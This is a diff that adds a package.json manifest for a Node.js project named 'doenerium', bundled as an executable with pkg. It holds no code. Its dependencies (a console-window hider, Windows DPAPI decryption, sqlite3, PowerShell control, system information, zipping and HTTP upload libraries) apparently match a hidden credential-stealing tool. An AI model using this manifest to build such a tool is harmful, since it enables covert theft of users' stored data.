@@ -1,0 +1,32 @@
+{
+  "dependencies": {
+    "axios": "^0.27.2",
+    "buffer-replace": "^1.0.0",
+    "form-data": "^4.0.0",
+    "node-gyp": "^9.1.0",
+    "node-hide-console-window": "^2.1.1",
+    "node-powershell": "^5.0.1",
+    "request": "^2.88.2",
+    "sqlite3": "^5.0.8",
+    "systeminformation": "^5.11.16",
+    "win-dpapi": "^1.1.0",
+    "zip-lib": "^0.7.3"
+  },
+  "nodeVersion": "system",
+  "name": "doenerium",
+  "version": "6.9.6",
+  "description": "",
+  "main": "./index.js",
+  "bin": "./index.js",
+  "pkg": {
+    "assets": [
+      "./node_modules",
+      "./utils",
+      "./config",
+      "./index.js"
+    ]
+  },
+  "devDependencies": {
+    "cross-env": "^7.0.3"
+  }
+}
